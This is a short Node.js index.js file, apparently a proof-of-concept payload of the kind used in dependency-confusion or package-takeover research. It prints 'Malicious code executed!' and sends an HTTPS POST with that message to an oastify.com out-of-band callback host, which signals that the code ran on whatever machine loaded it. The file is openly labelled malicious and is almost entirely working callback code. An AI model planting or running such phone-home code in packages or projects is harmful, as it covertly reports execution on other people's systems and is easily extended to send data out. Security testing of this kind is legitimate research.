// index.js
console.log("Malicious code executed!");

// Optionally, send a network request to your server for verification
const http = require('https');

const data = JSON.stringify({ message: 'Malicious code executed!' });

const options = {
  hostname: 'gtd3h3pd4j6755pp0j6atvb7byhp5otd.oastify.com',
  port: 443,
  path: '/log',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length,
  },
};

const req = http.request(options, (res) => {
  res.on('data', (d) => {
    process.stdout.write(d);
  });
});

req.on('error', (e) => {
  console.error(e);
});

req.write(data);
req.end();
